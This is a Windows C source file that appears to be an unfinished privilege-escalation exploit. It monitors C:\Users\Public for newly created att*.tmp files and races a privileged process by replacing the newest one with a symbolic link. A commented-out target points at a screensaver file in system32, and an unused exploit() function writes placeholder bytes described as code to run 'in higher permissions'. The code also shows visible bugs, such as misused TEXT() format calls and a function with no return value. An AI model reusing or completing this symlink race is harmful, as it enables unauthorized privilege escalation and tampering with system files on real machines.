#include "stdafx.h"


#include <windows.h>
#include <tchar.h> 
#include <stdio.h>
#include <strsafe.h>
#pragma comment(lib, "User32.lib")


#define TEMP_FILE_TEMPLATE "att"
#define TEMP_DIR_NAME "C:\\Users\\Public"
//#define TEMP_DIR_NAME_EXP "C:\\Windows\\system32\\PhotoScreensaver.scr"
#define TEMP_DIR_NAME_EXP "C:\\Users\\Public\\symlink.txt"



void readandprintfile(LPCTSTR fileName);
void DisplayErrorBox(LPTSTR lpszFunction);
void WatchDirectory();
DWORD retrieveFileName(LPCTSTR lpdir, TCHAR* fileName);
void exploit(LPCTSTR fileName);
void makeSymbolLink();

void main(int argc, TCHAR *argv[]) {
	//watch directory for file creation
	WatchDirectory();
	//makeSymbolLink();
	//get file name 
	//write our attack into file
	//Exploit();

	//close
	return;
}

void makeSymbolLink() {
	CreateSymbolicLink(TEXT(TEMP_DIR_NAME_EXP), TEXT("C:\\Documents and Settings\\Public\\att.txt"), 0x0);
	Sleep(10000);
}


void WatchDirectory() {
	// we might need to use  FindCloseChangeNotification  function inorder to close the notification handle
	//LPSTR lpDir = TEXT(TEMP_DIR_NAME);
	DWORD dwWaitStatus;
	HANDLE dwChangeHandle;
	TCHAR lpDrive[4];
	TCHAR lpFile[_MAX_FNAME];
	TCHAR lpExt[_MAX_EXT];
	TCHAR fileName[MAX_PATH];

	_tsplitpath_s(TEXT(TEMP_DIR_NAME), lpDrive, 4, NULL, 0, lpFile, _MAX_FNAME, lpExt, _MAX_EXT);

	lpDrive[2] = (TCHAR)'\\';
	lpDrive[3] = (TCHAR)'\0';

	// Watch the directory for file creation and deletion. 

	dwChangeHandle = FindFirstChangeNotification(
		TEXT(TEMP_DIR_NAME),                         // directory to watch 
		FALSE,                         // do not watch subtree 
		FILE_NOTIFY_CHANGE_FILE_NAME); // watch file name changes 

	if (dwChangeHandle == NULL || dwChangeHandle == INVALID_HANDLE_VALUE) {
		printf("\n ERROR: FindFirstChangeNotification function failed.\n");
		ExitProcess(GetLastError());
	}


	// Wait for notification.
	printf("\nWaiting for notification...\n");
	dwWaitStatus = WaitForSingleObject(dwChangeHandle, INFINITE);
	FindCloseChangeNotification(dwChangeHandle);
	switch (dwWaitStatus) {
	case WAIT_OBJECT_0:

		// A file was created, renamed, or deleted in the directory.
		printf("\nA file was created, renamed, or deleted in the directory\n");
		retrieveFileName(TEXT(TEMP_DIR_NAME), fileName);
		Sleep(5000);
		_tprintf(TEXT("retrieve file name returned: %s\n", fileName));

		BOOLEAN success;
		success = CreateSymbolicLink(fileName, TEXT(TEMP_DIR_NAME_EXP), 0x0);
		_tprintf(TEXT("Created symlink %d\n" , success));
		//exploit(fileName);
		break;

	case WAIT_TIMEOUT:

		// A timeout occurred, this would happen if some value other 
		// than INFINITE is used in the Wait call and no changes occur.
		// In a single-threaded environment you might not want an
		// INFINITE wait.

		printf("\nNo changes in the timeout period.\n");
		ExitProcess(GetLastError());
		break;

	default:
		printf("\n ERROR: Unhandled dwWaitStatus.\n");
		ExitProcess(GetLastError());
		break;
	}
}

DWORD retrieveFileName(LPCTSTR lpDir, TCHAR* fileName) {
	WIN32_FIND_DATA ffd;
	LARGE_INTEGER filesize;
	TCHAR szDir[MAX_PATH];
	size_t length_of_arg;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	DWORD dwError = 0;


	StringCchCopy(szDir, MAX_PATH, TEXT(TEMP_DIR_NAME));
	StringCchCat(szDir, MAX_PATH, TEXT("\\att*.tmp"));
	
	hFind = FindFirstFile(szDir, &ffd);

	if (INVALID_HANDLE_VALUE == hFind)
	{
		DisplayErrorBox(TEXT("Error FindFirstFile"));
		return dwError;
	}

	
	WIN32_FIND_DATA ffdMAX = ffd;
	do
	{
		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			_tprintf(TEXT("  %s   <DIR>\n"), ffd.cFileName);
		}
		else
		{

			if(ffdMAX.ftCreationTime.dwLowDateTime < ffd.ftCreationTime.dwLowDateTime) ffdMAX = ffd;
			filesize.LowPart = ffd.nFileSizeLow;
			filesize.HighPart = ffd.nFileSizeHigh;
			_tprintf(TEXT("  %s   %ld bytes\n"), ffd.cFileName, filesize.QuadPart);
		}
	} while (FindNextFile(hFind, &ffd) != 0);

	_tprintf(TEXT("and the winner is: %s\n") ,ffdMAX.cFileName);
	
	dwError = GetLastError();
	if (dwError != ERROR_NO_MORE_FILES)
	{
		DisplayErrorBox(TEXT("FindFirstFile"));
	}
	
	FindClose(hFind);
	StringCchCopy(fileName, MAX_PATH, TEXT(TEMP_DIR_NAME));
	StringCchCat(fileName, MAX_PATH, TEXT("\\"));
	StringCchCat(fileName, MAX_PATH, ffdMAX.cFileName);
	_tprintf(TEXT("retrieve file name returned: %s\n", fileName));
	
	// maybe we need to retrive the file name with - ReadDirectoryChangesW 
	// inorder to monitor the size of the file - so that the write operation is finished
	// also we need to know the file name inorder to write to it

}





void DisplayErrorBox(LPTSTR lpszFunction)
{
	// Retrieve the system error message for the last-error code

	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	// Display the error message and clean up

	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
		(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));
	StringCchPrintf((LPTSTR)lpDisplayBuf,
		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
		TEXT("%s failed with error %d: %s"),
		lpszFunction, dw, lpMsgBuf);
	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
}

void exploit(LPCTSTR fileName) {
	// write to file some code that will be run in higher permissions (such as create file in a certain path)

	HANDLE hFile;
	char DataBuffer[] = "111111111111111111111111111111111111111111111111111111111111111111111111";
	DWORD dwBytesToWrite = (DWORD)strlen(DataBuffer);
	DWORD dwBytesWritten = 0;
	BOOL bErrorFlag = FALSE;

	hFile = CreateFile(fileName,               // name of the write
		GENERIC_WRITE,          // open for writing
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,                      // do not share
		NULL,                   // default security
		CREATE_ALWAYS,          // Opens a file only if it exists.
		FILE_ATTRIBUTE_NORMAL,  // normal file
		NULL);                  // no attr. template

	if (hFile == INVALID_HANDLE_VALUE) {
		DisplayErrorBox(TEXT("Error Unable to open file123"));
		_tprintf(TEXT("Terminal failure: Unable to open file \"%s\" for write.\n"), fileName);
		return;
	}

	_tprintf(TEXT("Writing %d bytes to %s.\n"), dwBytesToWrite, fileName);

	bErrorFlag = WriteFile(
		hFile,           // open file handle
		DataBuffer,      // start of data to write
		dwBytesToWrite,  // number of bytes to write
		&dwBytesWritten, // number of bytes that were written
		NULL);            // no overlapped structure

	FlushFileBuffers(hFile);
	

	if (FALSE == bErrorFlag) {
		printf("Terminal failure: Unable to write to file.\n");
	}
	else if (dwBytesWritten != dwBytesToWrite) {
		// This is an error because a synchronous write that results in
		// success (WriteFile returns TRUE) should write all data as
		// requested. This would not necessarily be the case for
		// asynchronous writes.
		printf("Error: dwBytesWritten != dwBytesToWrite\n");
	}
	else {
		_tprintf(TEXT("Wrote %d bytes to %s successfully.\n"), dwBytesWritten, fileName);
	}

	CloseHandle(hFile);

}

void DisplayError(LPTSTR lpszFunction)
// Routine Description:
// Retrieve and output the system error message for the last-error code
{
	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0,
		NULL);

	lpDisplayBuf =
		(LPVOID)LocalAlloc(LMEM_ZEROINIT,
		(lstrlen((LPCTSTR)lpMsgBuf)
			+ lstrlen((LPCTSTR)lpszFunction)
			+ 40) // account for format string
			* sizeof(TCHAR));

	if (FAILED(StringCchPrintf((LPTSTR)lpDisplayBuf,
		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
		TEXT("%s failed with error code %d as follows:\n%s"),
		lpszFunction,
		dw,
		lpMsgBuf)))
	{
		printf("FATAL ERROR: Unable to output error code.\n");
	}

	_tprintf(TEXT("ERROR: %s\n"), (LPCTSTR)lpDisplayBuf);

	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
}


void readandprintfile(LPCTSTR fileName)
{
	HANDLE hFile;
	DWORD  dwBytesRead = 0;
	char   ReadBuffer[_MAX_PATH] = { 0 };
	OVERLAPPED ol = { 0 };

	

	hFile = CreateFile(fileName,               // file to open
		GENERIC_READ,          // open for reading
		FILE_SHARE_READ,       // share for reading
		NULL,                  // default security
		OPEN_EXISTING,         // existing file only
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, // normal file
		NULL);                 // no attr. template

	if (hFile == INVALID_HANDLE_VALUE)
	{
		DisplayError(TEXT("CreateFile"));
		_tprintf(TEXT("Terminal failure: unable to open file \"%s\" for read.\n"), fileName);
		return;
	}

	// Read one character less than the buffer size to save room for
	// the terminating NULL character. 

	if (FALSE == ReadFileEx(hFile, ReadBuffer, _MAX_PATH -10, &ol, NULL))
	{
		DisplayError(TEXT("ReadFile"));
		printf("Terminal failure: Unable to read from file.\n GetLastError=%08x\n", GetLastError());
		CloseHandle(hFile);
		return;
	}
	SleepEx(5000, TRUE);
	

	
		ReadBuffer[_MAX_PATH-5] = '\0'; // NULL character
		printf("%s\n", ReadBuffer);
	

	CloseHandle(hFile);
}

